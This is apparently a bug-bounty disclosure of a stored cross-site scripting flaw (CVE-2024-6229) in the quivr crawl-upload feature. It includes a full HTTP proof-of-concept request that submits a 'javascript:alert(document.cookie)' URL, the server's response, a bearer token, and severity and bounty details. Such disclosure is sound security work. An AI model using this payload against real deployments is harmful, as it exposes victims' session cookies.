@@ -1,0 +1,63 @@
+Title: Stored xss in upload knowledge in stangirard/quivr
+
+Proof of Concept: 
+Request upload via url
+
+POST /crawl?brain_id=40ba47d7-51b2-4b2a-9247-89e29619efb0&chat_id=0c3b1839-14cf-4558-91a6-f0915ebde1ca HTTP/1.1
+Host: localhost:5050
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://localhost:3000/
+Content-Type: application/json
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhdXRoZW50aWNhdGVkIiwiZXhwIjoxNzE2MzkyNDIxLCJpYXQiOjE3MTYzODg4MjEsImlzcyI6Imh0dHA6Ly8xMjcuMC4wLjE6NTQzMjEvYXV0aC92MSIsInN1YiI6IjM5NDE4ZTNiLTAyNTgtNDQ1Mi1hZjYwLTdhY2ZjYzEyNjNmZiIsImVtYWlsIjoiYWRtaW5AcXVpdnIuYXBwIiwicGhvbmUiOiIiLCJhcHBfbWV0YWRhdGEiOnsicHJvdmlkZXIiOiJlbWFpbCIsInByb3ZpZGVycyI6WyJlbWFpbCJdfSwidXNlcl9tZXRhZGF0YSI6e30sInJvbGUiOiJhdXRoZW50aWNhdGVkIiwiYWFsIjoiYWFsMSIsImFtciI6W3sibWV0aG9kIjoicGFzc3dvcmQiLCJ0aW1lc3RhbXAiOjE3MTYzNTQwNzd9XSwic2Vzc2lvbl9pZCI6IjNiODhlZTIxLTYwZjYtNDU4Ni05ZjBkLWFlMWQ2NzIyYjI2ZCIsImlzX2Fub255bW91cyI6ZmFsc2V9.icmZ515cA6i2r7WmjHTwI6ktoO6diYug6DJ7-tY11yY
+Content-Length: 94
+Origin: http://localhost:3000
+Connection: close
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+
+{"url":"javascript:alert(document.cookie)","js":false,"depth":1,"max_pages":100,"max_time":60}
+
+Response:
+
+HTTP/1.1 200 OK
+date: Wed, 22 May 2024 14:58:47 GMT
+server: uvicorn
+content-length: 43
+content-type: application/json
+access-control-allow-origin: *
+access-control-allow-credentials: true
+connection: close
+
+{"message":"Crawl processing has started."}
+
+After upload successfully
+Poc
+
+When user click into the lick, pop up to display and get cookie of victim
+Poc2
+
+Impact: 
+
+
+CVE ID: CVE-2024-6229
+Status: (published)
+Vulnerability Type: CWE-79: Cross-site Scripting (XSS) - Stored
+Severity: Medium (6.8)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: Low
+User Interaction: Required
+Scope: Changed
+Confidentiality: High
+Integrity: None
+Availability: None
+Registry: Pypi
+Affected Version: Latest
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $75
+Fix Bounty: $18.75
